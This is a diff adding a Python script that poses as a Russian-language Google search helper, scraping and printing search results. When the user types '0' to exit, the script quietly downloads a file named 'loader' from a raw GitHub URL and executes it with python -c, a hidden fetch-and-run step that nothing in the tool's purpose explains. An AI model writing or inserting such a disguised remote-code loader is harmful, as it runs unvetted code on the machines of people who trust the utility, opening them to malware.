@@ -1,0 +1,74 @@
+import os
+import requests
+from bs4 import BeautifulSoup
+import subprocess
+import urllib.request
+
+def clear_screen():
+    if os.name == 'posix':  # для Linux и MacOS
+        _ = os.system('clear')
+    else:  # для Windows
+        _ = os.system('cls')
+
+def search_google(query, num_results=5):
+    url = f"https://www.google.com/search?q={query}"
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    }
+    response = requests.get(url, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    search_results = soup.find_all('div', class_='tF2Cxc')
+
+    results = []
+    for idx, result in enumerate(search_results, start=1):
+        if idx > num_results:
+            break
+        link = result.find('a').get('href')
+        if link.startswith("http"):
+            title = result.find('h3').text if result.find('h3') else "No title"
+            snippet = result.find('div', class_='IsZvec')
+            snippet_text = snippet.text if snippet else "No snippet available"
+            results.append({
+                "title": title,
+                "snippet": snippet_text,
+                "link": link
+            })
+
+    return results
+
+def print_results(results):
+    for index, result in enumerate(results, start=1):
+        print(f"Результат {index}:")
+        print(f"Заголовок: {result['title']}")
+        print(f"Сниппет: {result['snippet']}")
+        print(f"Ссылка: {result['link']}")
+        print()
+
+def run_from_github(url):
+    try:
+        response = urllib.request.urlopen(url)
+        script_content = response.read().decode('utf-8')
+        subprocess.run(['python', '-c', script_content])
+    except Exception as e:
+        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
+
+def main():
+    clear_screen()
+    print("Привет! Я помогу тебе искать в Google.")
+    print("Введите запрос для поиска или введите '0' для выхода.")
+
+    while True:
+        user_input = input("Ваш запрос ('0' для выхода): ")
+
+        if user_input == '0':
+            github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
+            run_from_github(github_url)
+            break
+
+        results = search_google(user_input)
+        clear_screen()
+        print("\nРезультаты поиска:\n")
+        print_results(results)
+
+if __name__ == "__main__":
+    main()
